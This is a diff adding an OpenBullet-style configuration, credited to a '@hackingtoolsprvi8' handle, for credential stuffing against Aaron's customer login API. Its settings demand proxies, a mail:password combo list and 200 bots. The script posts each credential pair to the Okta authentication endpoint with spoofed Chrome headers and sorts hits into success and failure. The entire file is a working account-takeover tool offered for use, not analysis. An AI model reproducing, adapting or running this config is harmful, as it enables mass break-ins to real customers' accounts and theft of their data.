@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Aarons(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-26T23:26:26.1932177+02:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.aarons.com/api/v1/authn" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "accept-language: en" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 199" 
+  HEADER "content-type: application/json" 
+  HEADER "Host: login.aarons.com" 
+  HEADER "Origin: https://login.aarons.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" 
+  HEADER "x-okta-user-agent-extended: okta-auth-js/5.8.0 okta-signin-widget-5.16.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"errorCode\":\"E0000004\"" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"SUCCESS\"" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
